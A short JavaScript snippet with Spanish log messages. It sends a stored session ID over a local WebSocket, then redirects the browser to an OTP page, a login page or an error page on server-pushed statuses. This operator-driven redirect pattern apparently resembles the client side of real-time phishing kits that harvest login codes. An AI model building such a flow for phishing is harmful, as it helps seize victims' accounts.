const sessionId = localStorage.getItem('session_id');
const ws = new WebSocket("ws://localhost:8080/ws");

ws.onopen = () => {
    console.log("Conectado al servidor WebSocket");
    ws.send(JSON.stringify({ session_id: sessionId }));
};

ws.onmessage = (event) => {
    const data = JSON.parse(event.data);
    console.log("Estado recibido:", data.status);

    if (data.status === "otp") {
        window.location.href = "/otp.php";
    } else if (data.status === "login") {
        window.location.href = "/login.html";
    } else if (data.status === "errorOtp") {
        window.location.href = "/error.html";
    }
};

